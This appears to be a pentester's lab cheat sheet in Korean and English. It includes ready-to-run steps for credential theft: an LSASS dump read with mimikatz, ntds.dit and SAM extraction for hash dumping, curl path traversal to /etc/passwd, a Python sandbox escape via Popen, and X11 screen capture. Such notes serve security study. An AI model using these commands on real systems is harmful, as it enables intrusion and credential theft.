<details>
  <summary><strong>CHECK</strong></summary>
  

- web : `whatweb`/`curl`/`burpsuite crawler`/`⭐html code`
- sql : `injection`/`connect`/`enumeration`/`update`
- ftp : `upload`/`download`/`hidden files`
- http : `robots.txt`/`gobuster`/`feroxbuster`/`ffuf`/`error page`/`cookie에 따라서 redirection`/`.git`/`configuration file location`
- windows : `powershell history`/`whoami`/`⭐inside files(password leaking,source code,configurations)`/`responder-ntlm`
- linux : `inside files(password leaking,source code,configurations)`/`env`/`open ports`/`who have permissions(root or user?)`/`/var/mail`/`login user's group files`

<br>

- nmap : `-sU --top-ports 100`/`-Pn`
- ffuf : `-mc all`
- netexec : `--rid-brute`/`--users`(description 확인)
- grep : `-r '@dog.htb'`
- strings : `raw data catch flag recover deleted files`
- gobuster : `txt,md`/`-k(tls)`
- dirbuster : `~2017년도까지 대체재.`
- input : `우회를 시도하여서 다른 공격방법 테스트(command injection만 우회가 되는 것이 아니다.)`
- searchsploit : `버전을 확인할 수 없어도 페이로드 시도.`
- Docker : `Docker`버전을 확인하여 Privesc 시도.

</details>

---
<details>
  <summary><strong>Windows Privesc</strong></summary>
  
## SeDebugPrivilege
- `Task Manager > Details > choose LSASS > right click > Create dump file`
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
```
mimikatz.exe

log

sekurlsa::minidump lsass.dmp

sekurlsa::logonpasswords
```

- `https://github.com/decoder-it/psgetsystem`
```powershell
. .\psgetsys.ps1

ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
```

## SeTakeOwnershipPrivilege
- `https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1`
```powershell
Import-Module .\Enable-Privilege.ps1

.\EnableAllTokenPrivs.ps1

Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

takeown /f 'C:\Department Shares\Private\IT\cred.txt'

Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

## Backup Operators group
```
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

robocopy /B E:\Windows\NTDS .\ntds ntds.dit

reg save HKLM\SYSTEM system

reg save HKLM\SAM sam
```
```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```


</details>

---
<details>
  <summary><strong>Hex to ASCII</strong></summary>

```bash
# password : 504073737730726440313233212131323313917181922232526273031333435373839424349505154575861657475798283869091949598103106111114115119122123126130131134135
cat password | xxd -r -p
```
</details>

---
<details>
  <summary><strong>sed</strong></summary>

```bash
sed -i '1i /cgi-bin/' test.txt
```

</details>

---
<details>
  <summary><strong>tar</strong></summary>

```bash
# 압축
tar -cf target.tar foo bar

# 압축 해제
tar -xvzf target.tar
tar -xvzf target.tar.gz
tar -xvf filename.tar.bz2
```

</details>

---
<details>
  <summary><strong>sqlite3</strong></summary>
  
```bash
sqlite3 <dbname> .dump
sqlite3 credentials.db 'select name,password from users'

sqlite3 {dbname}
.headers on   # 컬럼 이름 출력
.mode column  # 표 형식으로 출력
.tables
select * from user;
.quit
```
  
</details>

---
<details>
  <summary><strong>CURL</strong></summary>

```bash
curl --path-as-is http://10.10.10.10/../../../../etc/passwd

curl -v http://localhost:8000

curl http://localhost -o output.txt
```
- `../../`와 같은 경로를 그대로 전달
- `-v`옵션으로 접속이 `NOT FOUND`인지 `UNAUTHORIZED`인지 확인.

</details>

---
<details>
  <summary><strong>PYTHON</strong></summary>

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html?highlight=python#misc-python
- `CLASS`를 찾아서 RCE 실행.(Popen)
```python3
#i = 0;
#for c in [].__class__.__base__.__subclasses__():
#    if c.__name__=="P"+"op"+"en":
#        print(c.__name__);
#        print(i);
#    i+=1;

[].__class__.__base__.__subclasses__()[317]('ping 10.10.16.4',shell=True);
```
  
</details>

---
<details>
  <summary><strong>BASH</strong></summary>

```bash
# 해당 경로 bashrc 내부의 환경변수,함수,명령어 등을 현재 셸에서 실행하는 명령.
. /opt/.bashrc

# 파일 크기가 0보다 큰지 검사.
[ -s log/photobomb.log ]

# 파일이 링크파일인지 검사.
[ -L log/photobomb.log ]
```
  
</details>

---
<details>
  <summary><strong>X11(.Xauthority)</strong></summary>

- https://book.hacktricks.wiki/en/network-services-pentesting/6000-pentesting-x11.html#screenshots-capturing

```bash
w
```
<img width="1103" height="103" alt="image" src="https://github.com/user-attachments/assets/9d532428-0519-4278-99f3-938062dc0a00" />

<br>
<br>

```bash
XAUTHORITY=/tmp/.Xauthority xdpyinfo -display :0

XAUTHORITY=/tmp/.Xauthority xwininfo -root -tree -display :0

XAUTHORITY=/tmp/.Xauthority xwd -root -screen -silent -display :0 > screenshot.xwd
```

</details>

---
<details>
  <summary><strong>DOCKER</strong></summary>

```bash
sudo docker images

sudo docker ps -a
```
- `image` : 레시피
- `container` : 레시피로 만든 요리.

<br>

```bash
sudo docker run -it -v $(pwd):/share <image>:latest
```
- `-it` : 대화형 터미널 모드 (interactive + tty)
- `-v` : 마운트

<br>

```bash
mount
```
- 컨테이너를 실행하면 `Docker`는 `OverlayFS`를 통해서 마운트.
- `mount`포인트에서 `overlay`를 캡쳐해서 컨테이너 확인.
  
</details>
